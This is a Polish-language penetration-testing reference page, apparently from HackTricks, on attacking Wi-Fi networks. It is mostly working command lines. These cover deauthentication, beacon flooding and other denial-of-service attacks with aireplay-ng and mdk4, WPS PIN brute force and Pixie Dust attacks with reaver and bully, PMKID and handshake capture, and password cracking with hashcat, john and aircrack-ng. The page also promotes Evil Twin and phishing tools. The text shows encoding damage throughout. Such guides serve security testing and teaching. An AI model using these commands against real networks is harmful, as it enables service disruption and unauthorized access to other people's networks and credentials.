# Testowanie penetracyjne Wifi

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na GitHubie.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**Spojrzenie na Hakowanie**\
Zajmij siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakowania

**AktualnoÅ›ci z Hakowania na Å»ywo**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakowania dziÄ™ki aktualnym wiadomoÅ›ciom i spostrzeÅ¼eniom

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i istotnymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## Podstawowe polecenia Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## NarzÄ™dzia

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Uruchom airgeddon za pomocÄ… dockera**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

MoÅ¼e przeprowadzaÄ‡ ataki Evil Twin, KARMA i Known Beacons, a nastÄ™pnie uÅ¼yÄ‡ szablonu phishingowego, aby uzyskaÄ‡ rzeczywiste hasÅ‚o sieci lub przechwyciÄ‡ dane uwierzytelniajÄ…ce spoÅ‚ecznoÅ›ciowe.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

To narzÄ™dzie automatyzuje ataki **WPS/WEP/WPA-PSK**. Automatycznie:

* Ustawia interfejs w tryb monitora
* Skanuje moÅ¼liwe sieci - i pozwala wybraÄ‡ ofiar(y)
* JeÅ›li WEP - Uruchamia ataki WEP
* JeÅ›li WPA-PSK
* JeÅ›li WPS: Atak Pixie dust i atak brutalnej siÅ‚y (bÄ…dÅº ostroÅ¼ny, atak brutalnej siÅ‚y moÅ¼e potrwaÄ‡ dÅ‚ugo). ZauwaÅ¼, Å¼e nie prÃ³buje pustego PIN-u ani PIN-Ã³w z bazy danych/wygenerowanych.
* PrÃ³buje przechwyciÄ‡ PMKID z AP w celu zÅ‚amania go
* PrÃ³buje dezautoryzowaÄ‡ klientÃ³w AP w celu przechwycenia uchwytu
* JeÅ›li PMKID lub Uchwyt, prÃ³buje ataku brutalnej siÅ‚y uÅ¼ywajÄ…c top5000 haseÅ‚.

## Podsumowanie AtakÃ³w

* **DoS**
* Pakiety dezautoryzacyjne/rozÅ‚Ä…czeniowe -- OdÅ‚Ä…cz wszystkich (lub okreÅ›lony ESSID/Klient)
* Losowe faÅ‚szywe AP -- Ukryj sieci, moÅ¼liwe zatrzymanie skanerÃ³w
* PrzeciÄ…Å¼ AP -- SprÃ³buj zabiÄ‡ AP (zazwyczaj maÅ‚o przydatne)
* WIDS -- Gra z IDS
* TKIP, EAPOL -- Kilka konkretnych atakÃ³w DoS na niektÃ³re AP
* **Åamanie**
* Åamanie **WEP** (kilka narzÄ™dzi i metod)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** atak brutalnej siÅ‚y
* \[DoS +] Przechwycenie **WPA handshake** + Åamanie
* **WPA-MGT**
* Przechwycenie **Nazwy uÅ¼ytkownika**
* **Atak brutalnej siÅ‚y** PoÅ›wiadczeÅ„
* **ZÅ‚y bliÅºniak** (z lub bez DoS)
* **Otwarty** ZÅ‚y bliÅºniak \[+ DoS] -- Przydatne do przechwycenia danych logowania do portalu przechwytujÄ…cego i/lub przeprowadzania atakÃ³w LAN
* **WPA-PSK** ZÅ‚y bliÅºniak -- Przydatne do atakÃ³w sieciowych, jeÅ›li znasz hasÅ‚o
* **WPA-MGT** -- Przydatne do przechwytywania poÅ›wiadczeÅ„ firmowych
* **KARMA, MANA**, **GÅ‚oÅ›ny MANA**, **Znany sygnaÅ‚**
* **+ Otwarty** -- Przydatne do przechwycenia danych logowania do portalu przechwytujÄ…cego i/lub przeprowadzania atakÃ³w LAN
* **+ WPA** -- Przydatne do przechwycenia uchwytÃ³w WPA

## DOS

### Pakiety Dezautoryzacyjne

**Opis z** [**tutaj**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Ataki **dezautoryzacyjne**, powszechna metoda w hakowaniu Wi-Fi, polegajÄ… na faÅ‚szowaniu ramek "zarzÄ…dzajÄ…cych", aby **przymusowo rozÅ‚Ä…czyÄ‡ urzÄ…dzenia z sieciÄ…**. Te niezaszyfrowane pakiety wprowadzajÄ… klientÃ³w w bÅ‚Ä…d, sugerujÄ…c, Å¼e pochodzÄ… z prawidÅ‚owej sieci, umoÅ¼liwiajÄ…c atakujÄ…cym zbieranie uchwytÃ³w WPA w celach Å‚amania lub trwaÅ‚ego zakÅ‚Ã³cania poÅ‚Ä…czeÅ„ sieciowych. Ta taktyka, zaskakujÄ…co prosta, jest szeroko stosowana i ma istotne implikacje dla bezpieczeÅ„stwa sieciowego.

**Deautoryzacja za pomocÄ… Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 oznacza deautoryzacjÄ™
* 1 to liczba deautoryzacji do wysÅ‚ania (moÅ¼esz wysÅ‚aÄ‡ wiele, jeÅ›li chcesz); 0 oznacza wysyÅ‚anie ich ciÄ…gle
* \-a 00:14:6C:7E:40:80 to adres MAC punktu dostÄ™pu
* \-c 00:0F:B5:34:30:30 to adres MAC klienta do deautoryzacji; jeÅ›li jest pominiÄ™ty, wysyÅ‚ane sÄ… deautoryzacje rozgÅ‚oszeniowe (nie zawsze dziaÅ‚ajÄ…)
* ath0 to nazwa interfejsu

### Pakiety rozÅ‚Ä…czenia

**Pakiety rozÅ‚Ä…czenia**, podobnie jak pakiety deautoryzacji, sÄ… rodzajem ramek zarzÄ…dzania uÅ¼ywanych w sieciach Wi-Fi. Te pakiety sÅ‚uÅ¼Ä… do zerwania poÅ‚Ä…czenia miÄ™dzy urzÄ…dzeniem (takim jak laptop lub smartfon) a punktem dostÄ™pu (AP). GÅ‚Ã³wna rÃ³Å¼nica miÄ™dzy rozÅ‚Ä…czeniem a deautoryzacjÄ… polega na ich scenariuszach uÅ¼ycia. Podczas gdy punkt dostÄ™pu emituje **pakiety deautoryzacji, aby wyraÅºnie usunÄ…Ä‡ urzÄ…dzenia szpiegowskie z sieci, pakiety rozÅ‚Ä…czenia sÄ… zazwyczaj wysyÅ‚ane, gdy punkt dostÄ™pu przechodzi przez wyÅ‚Ä…czenie, restart lub przeniesienie, co wymaga rozÅ‚Ä…czenia wszystkich podÅ‚Ä…czonych wÄ™zÅ‚Ã³w.**

**Ten atak moÅ¼na przeprowadziÄ‡ za pomocÄ… mdk4 (tryb "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **WiÄ™cej atakÃ³w DOS przez mdk4**

**Tutaj** [**link**](https://en.kali.tools/?p=864)**.**

**TRYB ATAKI b: Zatapianie BeaconÃ³w**

WysyÅ‚a ramki beaconÃ³w, aby pokazaÄ‡ faÅ‚szywe punkty dostÄ™pu (AP) klientom. Czasami moÅ¼e to spowodowaÄ‡ awariÄ™ skanerÃ³w sieciowych i nawet sterownikÃ³w!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**TRYB ATAKU a: UsÅ‚uga Odmowy Autoryzacji**

WysyÅ‚anie ramek autoryzacyjnych do wszystkich dostÄ™pnych punktÃ³w dostÄ™pu (AP) w zasiÄ™gu moÅ¼e przeciÄ…Å¼yÄ‡ te punkty dostÄ™pu, zwÅ‚aszcza gdy zaangaÅ¼owanych jest wiele klientÃ³w. Intensywny ruch moÅ¼e prowadziÄ‡ do niestabilnoÅ›ci systemu, powodujÄ…c zawieszenie siÄ™ niektÃ³rych punktÃ³w dostÄ™pu lub nawet ich zresetowanie.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**TRYB ATAKI p: Sondowanie SSID i Bruteforcing**

Sondowanie punktÃ³w dostÄ™pu (AP) sprawdza, czy SSID jest poprawnie ujawnione i potwierdza zasiÄ™g AP. Ta technika, w poÅ‚Ä…czeniu z **bruteforcingiem ukrytych SSID** z lub bez listy sÅ‚Ã³w, pomaga zidentyfikowaÄ‡ i uzyskaÄ‡ dostÄ™p do ukrytych sieci.

**TRYB ATAKI m: Wykorzystanie KontratakÃ³w Michaela**

WysyÅ‚anie losowych lub zduplikowanych pakietÃ³w do rÃ³Å¼nych kolejek QoS moÅ¼e wywoÅ‚aÄ‡ Kontratak Michaela na AP **TKIP**, prowadzÄ…c do jednominutowego wyÅ‚Ä…czenia AP. Ta metoda jest skutecznÄ… taktykÄ… ataku **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**TRYB ATAKI e: Wstrzykiwanie pakietÃ³w EAPOL Start i Logoff**

Zalewanie punktu dostÄ™powego pakietami **EAPOL Start** tworzy **faÅ‚szywe sesje**, przytÅ‚aczajÄ…c AP i blokujÄ…c prawidÅ‚owych klientÃ³w. Alternatywnie, wstrzykiwanie **faÅ‚szywych komunikatÃ³w EAPOL Logoff** wymusza rozÅ‚Ä…czenie klientÃ³w, obie metody skutecznie zakÅ‚Ã³cajÄ… usÅ‚ugi sieciowe.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**TRYB ATAKI s: Ataki na sieci siatkowe IEEE 802.11s**

RÃ³Å¼ne ataki na zarzÄ…dzanie poÅ‚Ä…czeniami i trasowaniem w sieciach siatkowych.

**TRYB ATAKI w: Konfuzja WIDS**

KrzyÅ¼owe Å‚Ä…czenie klientÃ³w z wieloma wÄ™zÅ‚ami WDS lub faÅ‚szywymi rogue AP moÅ¼e manipulowaÄ‡ Systemami Wykrywania i Zapobiegania WÅ‚amaniom, tworzÄ…c konfuzjÄ™ i potencjalne naduÅ¼ycia systemu.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**TRYB ATAKI f: Packet Fuzzer**

Fuzzer pakietÃ³w oferujÄ…cy rÃ³Å¼norodne ÅºrÃ³dÅ‚a pakietÃ³w i kompleksowy zestaw modyfikatorÃ³w do manipulacji pakietami.

### **Airggedon**

_**Airgeddon**_ oferuje wiÄ™kszoÅ›Ä‡ atakÃ³w proponowanych w poprzednich komentarzach:

![](<../../.gitbook/assets/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) upraszcza proces podÅ‚Ä…czania urzÄ…dzeÅ„ do routera, zwiÄ™kszajÄ…c szybkoÅ›Ä‡ i Å‚atwoÅ›Ä‡ konfiguracji sieci zaszyfrowanych za pomocÄ… **WPA** lub **WPA2** Personal. Jest nieskuteczny dla Å‚atwo kompromitowanej ochrony WEP. WPS wykorzystuje 8-cyfrowy PIN, sprawdzany w dwÃ³ch czÄ™Å›ciach, co czyni go podatnym na ataki brute-force ze wzglÄ™du na ograniczonÄ… liczbÄ™ kombinacji (11 000 moÅ¼liwoÅ›ci).

### Atak Brute Force na WPS

IstniejÄ… 2 gÅ‚Ã³wne narzÄ™dzia do wykonania tej akcji: Reaver i Bully.

* **Reaver** zostaÅ‚ zaprojektowany jako solidny i praktyczny atak na WPS, i zostaÅ‚ przetestowany na wielu punktach dostÄ™pu i implementacjach WPS.
* **Bully** to **nowa implementacja** ataku brute force na WPS, napisana w jÄ™zyku C. Posiada kilka zalet w porÃ³wnaniu z oryginalnym kodem reavera: mniej zaleÅ¼noÅ›ci, poprawiona wydajnoÅ›Ä‡ pamiÄ™ci i procesora, poprawna obsÅ‚uga kolejnoÅ›ci bajtÃ³w oraz bardziej stabilny zestaw opcji.

Atak wykorzystuje **podatnoÅ›Ä‡ PIN-a WPS**, w szczegÃ³lnoÅ›ci ujawnienie pierwszych czterech cyfr i rolÄ™ ostatniej cyfry jako sumy kontrolnej, uÅ‚atwiajÄ…c atak brute-force. Jednak obrona przed atakami brute-force, jak **blokowanie adresÃ³w MAC** agresywnych atakujÄ…cych, wymaga **rotacji adresÃ³w MAC** aby kontynuowaÄ‡ atak.

Po uzyskaniu PIN-a WPS za pomocÄ… narzÄ™dzi takich jak Bully lub Reaver, atakujÄ…cy moÅ¼e wydedukowaÄ‡ PSK WPA/WPA2, zapewniajÄ…c **trwaÅ‚y dostÄ™p do sieci**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Inteligentny atak siÅ‚owy**

To wyrafinowane podejÅ›cie koncentruje siÄ™ na PIN-ach WPS wykorzystujÄ…c znane podatnoÅ›ci:

1. **WczeÅ›niej odkryte PIN-y**: Wykorzystaj bazÄ™ danych znanych PIN-Ã³w powiÄ…zanych z konkretnymi producentami, ktÃ³rzy stosujÄ… jednolite PIN-y WPS. Ta baza danych koreluje pierwsze trzy oktety adresÃ³w MAC z prawdopodobnymi PIN-ami dla tych producentÃ³w.
2. **Algorytmy generowania PIN-Ã³w**: Wykorzystaj algorytmy takie jak ComputePIN i EasyBox, ktÃ³re obliczajÄ… PIN-y WPS na podstawie adresu MAC punktu dostÄ™powego (AP). Dodatkowo algorytm Arcadyan wymaga identyfikatora urzÄ…dzenia, co dodaje warstwÄ™ do procesu generowania PIN-Ã³w.

### Atak WPS Pixie Dust

**Dominique Bongard** odkryÅ‚ wadÄ™ w niektÃ³rych punktach dostÄ™powych (AP), dotyczÄ…cÄ… tworzenia tajnych kodÃ³w, znanych jako **nonce** (**E-S1** i **E-S2**). JeÅ›li te nonce'y mogÄ… zostaÄ‡ ustalone, zÅ‚amanie PIN-u WPS AP staje siÄ™ Å‚atwe. AP ujawnia PIN w specjalnym kodzie (hash), aby udowodniÄ‡, Å¼e jest on autentyczny i nie jest faÅ‚szywym (rogue) AP. Te nonce'y sÄ… w zasadzie "kluczami" do odblokowania "sejfu", ktÃ³ry przechowuje PIN WPS. WiÄ™cej informacji na ten temat moÅ¼na znaleÅºÄ‡ [tutaj](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

W prostych sÅ‚owach, problem polega na tym, Å¼e niektÃ³re AP nie uÅ¼ywaÅ‚y wystarczajÄ…co losowych kluczy do szyfrowania PIN-u podczas procesu poÅ‚Ä…czenia. Sprawia to, Å¼e PIN jest podatny na zgadywanie spoza sieci (atak siÅ‚owy offline).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
JeÅ›li nie chcesz przeÅ‚Ä…czaÄ‡ urzÄ…dzenia w tryb monitorowania, lub `reaver` i `bully` majÄ… jakieÅ› problemy, moÅ¼esz sprÃ³bowaÄ‡ [OneShot-C](https://github.com/nikita-yfh/OneShot-C). To narzÄ™dzie moÅ¼e przeprowadziÄ‡ atak Pixie Dust bez koniecznoÅ›ci przeÅ‚Ä…czania siÄ™ w tryb monitorowania.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Atak Null Pin

NiektÃ³re Åºle zaprojektowane systemy pozwalajÄ… nawet na uÅ¼ycie **Null PIN** (pustego lub nieistniejÄ…cego PIN-u) do uzyskania dostÄ™pu, co jest doÅ›Ä‡ nietypowe. NarzÄ™dzie **Reaver** potrafi wykryÄ‡ tÄ™ podatnoÅ›Ä‡, w przeciwieÅ„stwie do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Wszystkie proponowane ataki WPS moÅ¼na Å‚atwo wykonaÄ‡ za pomocÄ… _**airgeddon.**_

![](<../../.gitbook/assets/image (219).png>)

* 5 i 6 pozwalajÄ… Ci wyprÃ³bowaÄ‡ **swojÄ… niestandardowÄ… PIN** (jeÅ›li masz takÄ…)
* 7 i 8 wykonujÄ… atak **Pixie Dust**
* 13 pozwala przetestowaÄ‡ **PIN NULL**
* 11 i 12 bÄ™dÄ… **odzyskiwaÄ‡ Piny zwiÄ…zane z wybranym AP z dostÄ™pnych baz danych** i **generowaÄ‡** moÅ¼liwe **Piny** za pomocÄ…: ComputePIN, EasyBox i opcjonalnie Arcadyan (zalecane, dlaczego nie?)
* 9 i 10 przetestujÄ… **kaÅ¼dy moÅ¼liwy PIN**

## **WEP**

Tak zdezaktualizowany i nieuÅ¼ywany obecnie. Warto wiedzieÄ‡, Å¼e _**airgeddon**_ ma opcjÄ™ WEP o nazwie "All-in-One" do ataku na ten rodzaj zabezpieczenia. WiÄ™cej narzÄ™dzi oferuje podobne opcje.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**SpostrzeÅ¼enia Hakerskie**\
Zajmij siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci Hakerskie na Å»ywo**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerskiego dziÄ™ki aktualnoÅ›ciom i spostrzeÅ¼eniom na Å¼ywo

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i istotnymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

***

## WPA/WPA2 PSK

### PMKID

W 2018 roku **hashcat** [ujawniÅ‚](https://hashcat.net/forum/thread-7717.html) nowÄ… metodÄ™ ataku, unikalnÄ…, poniewaÅ¼ wymaga tylko **jednego pakietu** i nie wymaga, aby jakiekolwiek klienty byÅ‚y podÅ‚Ä…czone do docelowego AP â€” tylko interakcja miÄ™dzy atakujÄ…cym a AP.

Wiele nowoczesnych routerÃ³w dodaje **opcjonalne pole** do **pierwszej ramki EAPOL** podczas Å‚Ä…czenia, znane jako `Robust Security Network`. Zawiera to `PMKID`.

Jak wyjaÅ›nia oryginalny post, **PMKID** jest tworzony przy uÅ¼yciu znanych danych:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
MajÄ…c na uwadze, Å¼e "Nazwa PMK" jest staÅ‚a, znamy BSSID punktu dostÄ™pu i stacji, a `PMK` jest identyczny z tym z peÅ‚nego 4-stopniowego uÅ›cisku dÅ‚oni, **hashcat** moÅ¼e wykorzystaÄ‡ te informacje do zÅ‚amania PSK i odzyskania hasÅ‚a!

Aby **zbadaÄ‡** te informacje i **przeprowadziÄ‡** lokalnie atak brutalnej siÅ‚y na hasÅ‚o, moÅ¼esz:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
ZÅ‚apane **PMKIDs** zostanÄ… pokazane w **konsoli** i rÃ³wnieÅ¼ **zapisane** wewnÄ…trz \_ **/tmp/attack.pcap**\_\
Teraz przekonwertuj przechwycenie do formatu **hashcat/john** i zÅ‚am go:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
ProszÄ™ zauwaÅ¼yÄ‡, Å¼e poprawny format hasha zawiera **4 czÄ™Å›ci**, takie jak: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`. JeÅ›li twÃ³j zawiera **tylko** **3 czÄ™Å›ci**, to jest **nieprawidÅ‚owy** (przechwycenie PMKID nie byÅ‚o waÅ¼ne).

ZauwaÅ¼, Å¼e `hcxdumptool` **rÃ³wnieÅ¼ przechwytuje handshake** (coÅ› w tym stylu siÄ™ pojawi: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). MoÅ¼esz **przeksztaÅ‚ciÄ‡** handshake do formatu **hashcat**/**john** uÅ¼ywajÄ…c `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_ZauwaÅ¼yÅ‚em, Å¼e niektÃ³re uchwwyty rÄ™kojmi wykonane tym narzÄ™dziem nie mogÅ‚y zostaÄ‡ zÅ‚amane, nawet znajÄ…c poprawne hasÅ‚o. Zalecam przechwytywanie rÄ™kojmi rÃ³wnieÅ¼ tradycyjnym sposobem, jeÅ›li to moÅ¼liwe, lub przechwycenie kilku z nich za pomocÄ… tego narzÄ™dzia._

### Przechwytywanie rÄ™kojmi

Atak na sieci **WPA/WPA2** moÅ¼e byÄ‡ przeprowadzony poprzez przechwycenie **rÄ™kojmi** i prÃ³bÄ™ **zlania** hasÅ‚a **offline**. Ten proces polega na monitorowaniu komunikacji okreÅ›lonej sieci i **BSSID** na konkretnym **kanale**. Oto uproszczony przewodnik:

1. Zidentyfikuj **BSSID**, **kanaÅ‚** i **podÅ‚Ä…czonego klienta** docelowej sieci.
2. UÅ¼yj `airodump-ng`, aby monitorowaÄ‡ ruch sieciowy na okreÅ›lonym kanale i BSSID, w nadziei na przechwycenie rÄ™kojmi. Polecenie bÄ™dzie wyglÄ…daÄ‡ tak:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Aby zwiÄ™kszyÄ‡ szansÄ™ na przechwycenie handshake'a, na chwilÄ™ odÅ‚Ä…cz klienta od sieci, aby wymusiÄ‡ ponownÄ… autoryzacjÄ™. MoÅ¼na to zrobiÄ‡ za pomocÄ… polecenia `aireplay-ng`, ktÃ³re wysyÅ‚a pakietu deautoryzacyjne do klienta:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_NaleÅ¼y pamiÄ™taÄ‡, Å¼e gdy klient zostanie wylogowany, moÅ¼e prÃ³bowaÄ‡ poÅ‚Ä…czyÄ‡ siÄ™ z innym AP lub, w innych przypadkach, z innÄ… sieciÄ…._

Gdy w `airodump-ng` pojawiÄ… siÄ™ informacje dotyczÄ…ce handshake'u, oznacza to, Å¼e handshake zostaÅ‚ przechwycony i moÅ¼na zakoÅ„czyÄ‡ nasÅ‚uchiwanie:

![](<../../.gitbook/assets/image (172) (1).png>)

Po przechwyceniu handshake'u moÅ¼na go **zÅ‚amaÄ‡** za pomocÄ… `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### SprawdÅº, czy w pliku jest handshake

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_JeÅ›li to narzÄ™dzie znajdzie niekompletny handshake ESSID przed ukoÅ„czonym, nie wykryje poprawnego._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

W **konfiguracjach WiFi dla firm, napotkasz rÃ³Å¼ne metody uwierzytelniania**, z ktÃ³rych kaÅ¼da zapewnia inne poziomy bezpieczeÅ„stwa i funkcje zarzÄ…dzania. KorzystajÄ…c z narzÄ™dzi takich jak `airodump-ng` do analizy ruchu sieciowego, moÅ¼esz zauwaÅ¼yÄ‡ identyfikatory tych typÃ³w uwierzytelniania. NiektÃ³re powszechne metody obejmujÄ…:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Ta metoda obsÅ‚uguje tokeny sprzÄ™towe i jednorazowe hasÅ‚a w ramach EAP-PEAP. W przeciwieÅ„stwie do MSCHAPv2, nie korzysta z wyzwania rÃ³wieÅ›nika i przesyÅ‚a hasÅ‚a w postaci tekstowej do punktu dostÄ™pu, co stwarza ryzyko atakÃ³w typu downgrade.
2. **EAP-MD5 (Message Digest 5)**:
* Polega na wysyÅ‚aniu skrÃ³tu MD5 hasÅ‚a z klienta. **Nie jest zalecane** ze wzglÄ™du na podatnoÅ›Ä‡ na ataki sÅ‚ownikowe, brak uwierzytelniania serwera i brak moÅ¼liwoÅ›ci generowania sesyjnych kluczy WEP.
3. **EAP-TLS (Transport Layer Security)**:
* Wykorzystuje certyfikaty po stronie klienta i serwera do uwierzytelniania oraz moÅ¼e dynamicznie generowaÄ‡ klucze WEP oparte na uÅ¼ytkowniku i sesji w celu zabezpieczenia komunikacji.
4. **EAP-TTLS (Tunelowany Transport Layer Security)**:
* Zapewnia uwierzytelnianie wzajemne poprzez zaszyfrowany tunel, wraz z metodÄ… generowania dynamicznych, per-user, per-session kluczy WEP. Wymaga tylko certyfikatÃ³w po stronie serwera, a klienci uÅ¼ywajÄ… poÅ›wiadczeÅ„.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* DziaÅ‚a podobnie do EAP, tworzÄ…c tunel TLS do chronionej komunikacji. Pozwala na uÅ¼ycie sÅ‚abszych protokoÅ‚Ã³w uwierzytelniania na EAP ze wzglÄ™du na ochronÄ™ zapewnianÄ… przez tunel.
